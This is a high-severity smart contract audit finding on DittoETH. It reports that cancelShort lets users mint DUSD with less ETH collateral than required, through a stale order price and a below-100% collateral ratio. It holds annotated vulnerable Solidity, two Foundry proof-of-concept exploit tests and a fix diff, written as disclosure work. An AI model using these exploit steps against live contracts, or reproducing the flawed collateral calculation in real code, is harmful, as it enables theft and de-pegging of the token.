---
id: 21682
severity: "High"
---

# `DUSD` assets can be minted with less `ETH` collateral than required

## Description

I discovered that the current implementation has not fixed the issue [H-03 (Users can mint DUSD with less collateral than required which gives them free DUSD and may open a liquidatable position)](https://github.com/code-423n4/2024-03-dittoeth-findings/issues/134) raised in the previous C4 audit.

To mint the `DUSD` assets with less collateral than required, a user or attacker executes the `OrdersFacet::cancelShort()` to cancel the `shortOrder` with its `shortRecord.ercDebt` < `minShortErc` (i.e., `shortRecord.status` == `SR.PartialFill`).

The `OrdersFacet::cancelShort()` will [execute another internal function, `LibOrders::cancelShort()`](https://github.com/code-423n4/2024-07-dittoeth/blob/ca3c5bf8e13d0df6a2c1f8a9c66ad95bbad35bce/contracts/facets/OrdersFacet.sol#L60) (`@1` in the snippet below), to do the short canceling job. If the `shortOrder`’s corresponding `shortRecord.status` == `SR.PartialFill` and has `shortRecord.ercDebt` < `minShortErc`, the steps [`@2.1`](https://github.com/code-423n4/2024-07-dittoeth/blob/ca3c5bf8e13d0df6a2c1f8a9c66ad95bbad35bce/contracts/libraries/LibOrders.sol#L944) and [`@2.2`](https://github.com/code-423n4/2024-07-dittoeth/blob/ca3c5bf8e13d0df6a2c1f8a9c66ad95bbad35bce/contracts/libraries/LibOrders.sol#L946) will get through.

Since the `shortRecord` is less than the `minShortErc`, the `cancelShort()` has to fill an `ercDebt` for more to reach the `minShortErc` threshold (so that the partially filled `shortRecord.ercDebt` will == `minShortErc`). Specifically, the function has to virtually mint the `DUSD` assets to increase the `ercDebt` by spending the `shortRecord.collateral` (Let’s name it the `collateralDiff`) for exchange.

Here, we come to the root cause in [`@3`](https://github.com/code-423n4/2024-07-dittoeth/blob/ca3c5bf8e13d0df6a2c1f8a9c66ad95bbad35bce/contracts/libraries/LibOrders.sol#L953). To calculate the `collateralDiff`:

1. The `shortOrder.price` is used instead of the current price. Nevertheless, the `shortOrder.price` can be stale (less or higher than the current price).
2. The `shortOrder.shortOrderCR` (i.e., the `cr` variable in the snippet below) is used, which can be less than 100% CR.

If the `shortOrder.price` is less than the current price and/or the `shortOrder.shortOrderCR` is less than 100% CR, the calculated `collateralDiff` will have a value less than the value of the `DUSD` assets that get minted ([`@4`](https://github.com/code-423n4/2024-07-dittoeth/blob/ca3c5bf8e13d0df6a2c1f8a9c66ad95bbad35bce/contracts/libraries/LibOrders.sol#L960)).

```solidity
// FILE: https://github.com/code-423n4/2024-07-dittoeth/blob/main/contracts/facets/OrdersFacet.sol
function cancelShort(address asset, uint16 id) external onlyValidAsset(asset) nonReentrant {
    STypes.Order storage short = s.shorts[asset][id];
    if (msg.sender != short.addr) revert Errors.NotOwner();
    if (short.orderType != O.LimitShort) revert Errors.NotActiveOrder();

    //@audit @1 -- Execute the cancelShort() to cancel the shortOrder with 
    //             its shortRecord.ercDebt < minShortErc (SR.PartialFill).
@1  LibOrders.cancelShort(asset, id);
}

// FILE: https://github.com/code-423n4/2024-07-dittoeth/blob/main/contracts/libraries/LibOrders.sol
function cancelShort(address asset, uint16 id) internal {
    ...

    if (shortRecord.status == SR.Closed) {
        ...
@2.1} else { //@audit @2.1 -- shortRecord.status == SR.PartialFill

        uint256 minShortErc = LibAsset.minShortErc(Asset);
@2.2    if (shortRecord.ercDebt < minShortErc) { //@audit @2.2 -- shortRecord.ercDebt < minShortErc

            // @dev prevents leaving behind a partially filled SR under minShortErc
            // @dev if the corresponding short is cancelled, then the partially filled SR's debt will == minShortErc
            uint88 debtDiff = uint88(minShortErc - shortRecord.ercDebt); // @dev(safe-cast)
            {
                STypes.Vault storage Vault = s.vault[vault];

                //@audit @3 -- To calculate the collateralDiff:
                //             1) The shortOrder.price is used instead of the current price.
                //                 -> The shortOrder.price can be stale (less or higher than the current price).
                //
                //             2) The shortOrder.shortOrderCR (i.e., cr) is used, which can be less than 100% CR.
@3              uint88 collateralDiff = shortOrder.price.mulU88(debtDiff).mulU88(cr);

                LibShortRecord.fillShortRecord(
                    asset,
                    shorter,
                    shortRecordId,
                    SR.FullyFilled,
@4              collateralDiff, //@audit @4 -- The collateralDiff's value can be less than the value of the DUSD assets that get minted.
                    debtDiff,
                    Asset.ercDebtRate,
                    Vault.dethYieldRate,
                    0
                );

                Vault.dethCollateral += collateralDiff;
                Asset.dethCollateral += collateralDiff;
                Asset.ercDebt += debtDiff;

                // @dev update the eth refund amount
                eth -= collateralDiff;
            }
            // @dev virtually mint the increased debt
            s.assetUser[asset][shorter].ercEscrowed += debtDiff;
        } else {
            ...
        }
    }

    ...
}
```

* `@1`: <https://github.com/code-423n4/2024-07-dittoeth/blob/ca3c5bf8e13d0df6a2c1f8a9c66ad95bbad35bce/contracts/facets/OrdersFacet.sol#L60>
* `@2.1`: <https://github.com/code-423n4/2024-07-dittoeth/blob/ca3c5bf8e13d0df6a2c1f8a9c66ad95bbad35bce/contracts/libraries/LibOrders.sol#L944>
* `@2.2`: <https://github.com/code-423n4/2024-07-dittoeth/blob/ca3c5bf8e13d0df6a2c1f8a9c66ad95bbad35bce/contracts/libraries/LibOrders.sol#L946>
* `@3`: <https://github.com/code-423n4/2024-07-dittoeth/blob/ca3c5bf8e13d0df6a2c1f8a9c66ad95bbad35bce/contracts/libraries/LibOrders.sol#L953>
* `@4`: <https://github.com/code-423n4/2024-07-dittoeth/blob/ca3c5bf8e13d0df6a2c1f8a9c66ad95bbad35bce/contracts/libraries/LibOrders.sol#L960>

Users or attackers can mint the `DUSD` assets with less `ETH` collateral than required (i.e., free money). This vulnerability is critical and can lead to the de-pegging of the `DUSD` token.

## Proof of Concept

This section provides a coded PoC.

Place the `test_MintFreeDUSD()` and `test_MintBelowPrice()` in the `.test/Shorts.t.sol` file and declare the following `import` directive at the top of the test file: `import {STypes, MTypes, O, SR} from "contracts/libraries/DataTypes.sol";`.

There are two test functions. Execute the commands:

1. `forge test -vv --mt test_MintFreeDUSD`
2. `forge test -vv --mt test_MintBelowPrice`

`PoC #1` shows we can mint the free `DUSD` by canceling the `shortOrder` with the `shortOrderCR` < 100%. For `PoC #2`, we can mint the free `DUSD` by canceling the `shortOrder` with the `price` < the current price.

_Note: in the current codebase, the developer has improved how to source more collateral if the`CR` < `initialCR` in the `createLimitShort()`. For this reason, I had to modify the original test functions developed by `nonseodion` to make them work again. Thanks to `nonseodion`._

```solidity
// Require: import {STypes, MTypes, O, SR} from "contracts/libraries/DataTypes.sol";

// Credit:
//  - Original by: nonseodion
//  - Modified by: serial-coder
function test_MintFreeDUSD() public { // PoC #1
    // Set the initial, penalty and liquidation CRs
    vm.startPrank(owner);
    // Set below 200 to allow shorter provide less than 100% of debt
    diamond.setInitialCR(asset, 170); 
    diamond.setPenaltyCR(asset, 120);
    diamond.setLiquidationCR(asset, 150);
    vm.stopPrank();

    // Create a bid to match the short and change its state to SR.PartialFill
    fundLimitBidOpt(1 ether, 0.01 ether, receiver);

    // How to calculate the ethInitial:
    //      minEth = price.mul(minShortErc);
    //      diffCR = initialCR - CR;
    //      ethInitial = minEth.mul(diffCR);
    uint88 ethInitial = 2000 ether;

    // Create the short providing only 70% of the dusd to be minted
    uint88 price = 1 ether;
    depositEth(sender, price.mulU88(5000 ether).mulU88(0.7 ether) + ethInitial);
    uint16[] memory shortHintArray = setShortHintArray();
    MTypes.OrderHint[] memory orderHintArray = diamond.getHintArray(asset, price, O.LimitShort, 1);
    vm.prank(sender);
    diamond.createLimitShort(asset, uint80(price), 5000 ether, orderHintArray, shortHintArray, 70);

    STypes.ShortRecord memory short = getShortRecord(sender, C.SHORT_STARTING_ID);
    // Successfully matches the bid
    assertTrue(short.status == SR.PartialFill);
    
    // Cancel the short to use up collateral provided and mint dusd
    vm.prank(sender);
    cancelShort(101);

    short = getShortRecord(sender, C.SHORT_STARTING_ID);
    assertEq(short.ercDebt, 2000 ether); // 2000 dusd minted
    assertEq(short.collateral, 0.01 ether + 0.7 * 2000 ether + ethInitial); // 70% of ETH collateral provided

    // The position is no longer liquidatable because the developer has improved 
    // how to source more collateral if CR < initialCR in the createLimitShort().
    // However, we can still use the CR of 70% to calculate the collateral
    // whose value is less than the value of DUSD that gets minted.
}

// Credit:
//  - Original by: nonseodion
//  - Modified by: serial-coder
function test_MintBelowPrice() public { // PoC #2
    // Create a bid to match the short and change its state to SR.PartialFill
    fundLimitBidOpt(1 ether, 0.01 ether, receiver);

    // Create the short providing 500% of the dusd to be minted
    // Current initialCR is 500%
    uint88 price = 1 ether;
    depositEth(sender, price.mulU88(5000 ether).mulU88(5 ether));
    uint16[] memory shortHintArray = setShortHintArray();
    MTypes.OrderHint[] memory orderHintArray = diamond.getHintArray(asset, price, O.LimitShort, 1);
    vm.prank(sender);
    diamond.createLimitShort(asset, uint80(price), 5000 ether, orderHintArray, shortHintArray, 500);

    STypes.ShortRecord memory short = getShortRecord(sender, C.SHORT_STARTING_ID);
    assertTrue(short.status == SR.PartialFill); // CR is partially filled by bid
    
    // Set the new price to 1.5 ether so that price increase
    uint256 newPrice = 1.5 ether;
    skip(15 minutes);
    ethAggregator.setRoundData(
        92233720368547778907 wei, int(newPrice.inv()) / ORACLE_DECIMALS, block.timestamp, block.timestamp, 92233720368547778907 wei
    );
    fundLimitBidOpt(1 ether, 0.01 ether, receiver);
    assertApproxEqAbs(diamond.getProtocolAssetPrice(asset), newPrice, 15000000150);

    // Cancel the short to mint at 1 ether instead of 1.5 ether
    vm.prank(sender);
    cancelShort(101);

    short = getShortRecord(sender, C.SHORT_STARTING_ID);
    assertEq(short.ercDebt, 2000 ether); // 2000 dusd minted
    // 2000 dusd minted for 10000 ether (500% at price of 1 ether) 
    // instead of 15000 ether (500% at price of 1.5 ether)
    assertEq(short.collateral, 0.01 ether + 5*2000 ether);

    // Position is liquidatable
    assertGt( diamond.getAssetNormalizedStruct(asset).liquidationCR, short.collateral.div(short.ercDebt.mul(1.5 ether)));
}
```

## Recommendation

When calculating the `collateralDiff`:

1. Use the current price instead of the `shortOrder.price`.
2. If the `shortOrder.shortOrderCR` < `initialCR`, use the `initialCR` as the collateral ratio instead of the `shortOrder.shortOrderCR`.

_Note: I have slightly modified the original recommended code of`nonseodion` to make it work with the current codebase. Thanks to `nonseodion` again._

```solidity
// Credit:
//  - Original by: nonseodion
//  - Modified by: serial-coder
function cancelShort(address asset, uint16 id) internal {
    ...

    if (shortRecord.status == SR.Closed) {
        ...
    } else {
        uint256 minShortErc = LibAsset.minShortErc(Asset);
       if (shortRecord.ercDebt < minShortErc) { 
            // @dev prevents leaving behind a partially filled SR under minShortErc
            // @dev if the corresponding short is cancelled, then the partially filled SR's debt will == minShortErc
            uint88 debtDiff = uint88(minShortErc - shortRecord.ercDebt); // @dev(safe-cast)
            {
                STypes.Vault storage Vault = s.vault[vault];

-               uint88 collateralDiff = shortOrder.price.mulU88(debtDiff).mulU88(cr);
+               uint256 newCR = convertCR(
+                   shortOrder.shortOrderCR < s.asset[asset].initialCR ? s.asset[asset].initialCR : shortOrder.shortOrderCR
+               );
+               uint80 price = uint80(LibOracle.getSavedOrSpotOraclePrice(asset));
+               uint88 collateralDiff = price.mulU88(debtDiff).mulU88(newCR);

                LibShortRecord.fillShortRecord(
                    asset,
                    shorter,
                    shortRecordId,
                    SR.FullyFilled,
                    collateralDiff,
                    debtDiff,
                    Asset.ercDebtRate,
                    Vault.dethYieldRate,
                    0
                );

                Vault.dethCollateral += collateralDiff;
                Asset.dethCollateral += collateralDiff;
                Asset.ercDebt += debtDiff;

                // @dev update the eth refund amount
                eth -= collateralDiff;
            }
            // @dev virtually mint the increased debt
            s.assetUser[asset][shorter].ercEscrowed += debtDiff;
        } else {
            ...
        }
    }

    ...
}
```

_Note: see[original submission](https://github.com/code-423n4/2024-07-dittoeth-findings/issues/8) for full discussion._

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability allows a user or attacker to mint DUSD tokens with less ETH collateral than the protocol requires by exploiting the cancelShort function in the OrdersFacet contract. The root cause lies in the calculation of the collateral difference (collateralDiff) when a short order is cancelled while its shortRecord.ercDebt is below the minimum short debt (minShortErc). The function uses the stale shortOrder.price instead of the current market price and applies the shortOrder.shortOrderCR, which may be below 100%, to compute the amount of ETH that should be taken as collateral. When either the price is outdated or the collateral ratio is too low, the computed collateralDiff is insufficient to cover the newly minted DUSD amount, resulting in a virtual mint where DUSD is created without the proper ETH backing. An attacker can trigger this by creating a partially filled short order (status SR.PartialFill) with a low collateral ratio or by allowing the market price to move after the order is placed, then calling cancelShort. The contract will fill the short record to the minimum debt threshold, virtually mint the missing DUSD, and deduct only the underestimated collateralDiff from the user’s ETH balance. From the user’s perspective the symptoms are a reduction in ETH collateral that is smaller than expected and an unexpected increase in DUSD balance, effectively receiving free DUSD. This under‑collateralized mint can de‑peg the DUSD token, create liquidatable positions, and compromise the economic safety of the protocol. The issue occurs whenever a short order is cancelled while its debt is below the minimum and the price or collateral ratio used for the calculation is stale or below the required level. It affects any user who creates or cancels short orders, as well as the protocol’s overall stability and other participants who rely on the DUSD peg. The bug was discovered during a follow‑up audit after a previous finding (H‑03) and reproduced with targeted unit tests that cancel shorts under manipulated price or collateral‑ratio conditions. It is hard to notice because the contract does not emit explicit warnings about under‑collateralized minting, and the state changes appear normal (the short record reaches the minimum debt). The vulnerability belongs to the class of accounting and collateral‑ratio miscalculation bugs, where internal accounting logic fails to enforce required collateral constraints. The recommended fix is to compute collateralDiff using the current oracle price and to enforce a collateral ratio that is never below the asset’s initialCR, thereby ensuring that the ETH taken always matches the value of the DUSD minted.
